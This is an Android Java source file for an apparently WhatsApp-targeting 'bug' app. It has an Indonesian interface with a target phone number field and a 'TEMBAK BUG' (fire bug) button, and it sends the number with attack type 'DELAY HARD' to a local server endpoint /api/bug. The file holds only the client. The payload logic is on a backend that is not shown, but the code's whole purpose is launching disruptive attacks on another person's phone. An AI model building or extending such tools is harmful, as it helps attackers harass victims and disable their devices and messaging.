package com.wabug.syam;

import android.app.Activity;
import android.graphics.Color;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import org.json.JSONObject;

public class MainActivity extends Activity {
    EditText inputTarget;
    Button btnAttack;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(50, 50, 50, 50);
        layout.setBackgroundColor(Color.parseColor("#0B0914"));

        inputTarget = new EditText(this);
        inputTarget.setHint("Nomor Target");
        inputTarget.setTextColor(Color.WHITE);
        inputTarget.setBackgroundColor(Color.parseColor("#2A1B4D"));
        layout.addView(inputTarget);

        btnAttack = new Button(this);
        btnAttack.setText("TEMBAK BUG");
        layout.addView(btnAttack);

        setContentView(layout);

        btnAttack.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String target = inputTarget.getText().toString().trim();
                if(target.isEmpty()) return;
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            URL url = new URL("http://127.0.0.1:3000/api/bug");
                            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                            conn.setRequestMethod("POST");
                            conn.setRequestProperty("Content-Type", "application/json; utf-8");
                            conn.setDoOutput(true);
                            JSONObject json = new JSONObject();
                            json.put("target", target);
                            json.put("type", "DELAY HARD");
                            OutputStream os = conn.getOutputStream();
                            os.write(json.toString().getBytes("UTF-8"));
                            os.close();
                            runOnUiThread(new Runnable() {
                                public void run() {
                                    Toast.makeText(MainActivity.this, "Perintah dikirim!", Toast.LENGTH_SHORT).show();
                                }
                            });
                        } catch (Exception e) {
                            runOnUiThread(new Runnable() {
                                public void run() {
                                    Toast.makeText(MainActivity.this, "Gagal konek server!", Toast.LENGTH_SHORT).show();
                                }
                            });
                        }
                    }
                }).start();
            }
        });
    }
    }
